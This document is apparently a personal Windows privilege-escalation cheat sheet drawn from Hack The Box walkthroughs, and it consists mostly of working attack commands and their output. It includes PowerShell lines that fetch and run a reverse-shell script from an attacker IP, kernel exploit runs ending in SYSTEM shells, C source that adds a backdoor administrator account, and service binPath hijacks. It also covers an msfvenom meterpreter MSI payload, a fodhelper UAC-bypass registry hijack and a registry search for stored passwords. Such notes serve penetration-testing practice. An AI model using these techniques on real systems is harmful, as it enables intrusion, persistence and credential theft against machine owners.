# Windows Privilege Escalation

## Upgrade Shell

[Fully interactive reverse shell on Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#fully-interactive-reverse-shell-on-windows)

Server Side

``` bash
stty raw -echo; (stty size; cat) | sudo nc -lvnp myport
```

Client Side

``` bash
powershell IEX(IWR http://myip/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell myip myport
```

File [Invoke-ConPtyShell.ps1](https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1)

## User Enumeration

Current User

``` bash
whoami
```

``` bash
net user <username>
```

``` bash
whoami /groups
```

Other Users

``` bash
net user
```

``` bash
net localgroup administrators
```

Hostname

``` bash
hostname
```

## Installed and Patch Levels

``` bash
wmic product get name, version, vendor
```

``` bash
dir "C:\Program Files"
```

``` bash
dir "C:\Program Files (x86)"
```

Patch Levels

``` bash
wmic qfe get Caption, Description, HotFixID, InstalledOn
```

## Device Drivers & Kernel Modules

Using powershell >>>

``` bash
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
```

``` bash
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

[https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated)

### OS & Architecture & Driver

OS & Architecture

``` bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

Driver Enumeration

``` bash
driverquery /v
```

### 6.3.9600 Kernel-Mode Drivers

``` bash
C:\Users\kostas\Desktop>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
System Type:               x64-based
```

[https://github.com/leecybersec/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip](https://github.com/leecybersec/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip)

``` bash
C:\inetpub\drupal-7.54>ms15-051x64.exe "powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"
ms15-051x64.exe "powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 1076 created.
==============================
```

``` bash
$ sudo nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.9] 53968
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system
```

[CVE-2015-1701](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/007-bastard_drupa7.54_MS15-051-6.3.9600#cve-2015-1701)

### 6.3.9600 rgnobj Integer O-flow

``` bash
C:\Users\kostas\Desktop>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
System Type:               x64-based
```

``` bash
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
```

``` bash
C:\Users\kostas\Desktop>41020.exe
41020.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system
```

[https://github.com/leecybersec/walkthrough/tree/master/hackthebox/006-optimum_httpfileserver-2.3_ms16-098-6.3.9600#rgnobj-integer-overflow](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/006-optimum_httpfileserver-2.3_ms16-098-6.3.9600#rgnobj-integer-overflow)

### 6.1.7600 Ancillary Func Driver

[https://www.exploit-db.com/exploits/40564](https://www.exploit-db.com/exploits/40564)

``` bash
c:\windows\system32\inetsrv>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
System Type:               X86-based PC
```

``` bash
i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
```

``` bash
c:\Users\Public>40564.exe
40564.exe

c:\Windows\System32>whoami
whoami
nt authority\system
```

[Vulnerability in Ancillary Function Driver](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/003-devel_aspx-backdoor_ms11-046-6.1.7600#vulnerability-in-ancillary-function-driver)

### Windows MS11-046 kernel

``` bash
c:\Windows\System32>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
OS Name:                   Microsoftr Windows Serverr 2008 Standard 
OS Version:                6.0.6001 Service Pack 1 Build 6001
```

[https://github.com/abatchy17/WindowsExploits/tree/master/MS11-046](https://github.com/abatchy17/WindowsExploits/tree/master/MS11-046)

``` bash
C:\wamp\www>MS11-046.exe
MS11-046.exe

c:\Windows\System32>whoami
whoami
nt authority\system
```

## Scheduled Tasks

``` bash
schtasks /query /fo LIST /v
```

``` bash
schtasks /query /fo LIST /v | findstr /B /C:"Task To Run" /C:"Next Run Time" /C:"Last Run Time" /C:"Schedule Type" /C:"Start Time" /C:"Start Date"
```

## Processes and Services

``` bash
tasklist /SVC
```

Active network connection

``` bash
netstat -ano
```

### Insecure Service Permissions

``` bash
sc qc Apache
```

``` bash
accesschk64.exe -uwcqv <user> *
```

==> `Service All Access` or `Service Change Config`

``` bash
sc config "service" binPath= "net localgroup administrators user /add"
```

``` bash
sc config "service" binPath= "c:\users\public\shell.exe"
```

[https://asfiyashaikh.medium.com/windows-privesc-weak-service-permission-b90f3bf4d44f](https://asfiyashaikh.medium.com/windows-privesc-weak-service-permission-b90f3bf4d44f)

[https://medium.com/@orhan_yildirim/windows-privilege-escalation-insecure-service-permissions-e4f33dbff219](https://medium.com/@orhan_yildirim/windows-privilege-escalation-insecure-service-permissions-e4f33dbff219)

## Readable/Writable

Using accesschk

``` bash
accesschk.exe -accepteula
```

``` bash
accesschk.exe -uws <user> "C:\Program Files"
```

Using powershell

``` bash
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

``` bash
Get-ChildItem "C:\Users\windows_10_1903_x64\Desktop" -Recurse | Get-ACL | findstr /C:"<user-name>"
```

### Leveraging Unquoted Paths

``` bash
wmic service get displayname,pathname
```

``` bash
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

### Insecure File Permissions

Get Server and Path to running

Powershell >>>

``` bash
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

=== "Check permission"

	``` bash
	icacls "C:\Windows\system32\wbem\WmiApSrv.exe"
	```

=== "refer icacls"

	[icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls#remarks)

	|Mask| Permissions|
	|---|---|
	|F| Full access|
	|M| Modify access|
	|RX| Read and execute access|
	|R| Read-only access|
	|W| Write-only access|

Overwrite file if have F or W permission.

=== "Compile code adduser.c"

	``` bash
	i686-w64-mingw32-gcc adduser.c -o adduser.exe
	```

=== "adduser.c"

	``` c
	#include <stdlib.h>

	int main ()
	{
	    int add;
	    add = system ("net user backup Adm1nP@ssWD /add");
	    add = system ("net localgroup administrators backup /add");
	    return 0;
	} 
	```

Move file `adduser.exe`

``` bash
move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"
```

Check StartMode for service

``` bash
wmic service where caption="Serviio" get name, caption, state, startmode
```

Check rights for restart system

``` bash
whoami /priv
```

Restart system

``` bash
shutdown /r /t 0
```

Check Administrators group

``` bash
net localgroup Administrators
```

## Binaries That AutoElevate

### AlwaysInstallElevated

[https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated)

Enum commands

``` bash
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

``` bash
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

``` bash
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Exploit

``` bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4567 -f msi > /root/Desktop/1.msi
```

``` bash
msiexec /quiet /qn /i 1.msi
```

## Bypass UAC registry hijacking 

Check Mandatory Level

``` bash
whoami /groups
```

Run cmd.exe as Administrator to get High Mandatory Level

``` bash
powershell.exe Start-Process cmd.exe -Verb runAs
```

`C:\Windows\System32\fodhelper.exe`

``` bash
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
```

``` bash
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
```

``` bash
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Users\windows_10_1903_x64\Desktop\shell.exe" /f
```


## Unmounted Disks

``` bash
mountvol
```

## Networking Enumeration

``` bash
ipconfig /all
```

``` bash
route print
```

## Firewall Status and Rules

``` bash
netsh advfirewall show currentprofile
```

``` bash
netsh advfirewall firewall show rule name=all
```

## Enumeration Tools

[windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)

``` bash
windows-privesc-check2.exe --help
```

[winPEASexe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/binaries)

``` bash
winPEASx86.exe
```

## More commands

### Add Local Admin User

``` bash
net user /add <user> <pass>
```

``` bash
net localgroup administrators <user> /add
```

### Run CMD as Admin

``` bash
powershell.exe Start-Process cmd.exe -Verb runAs
```

### Clear text stored

``` bash
reg query HKLM /f pass /t REG_SZ /s
```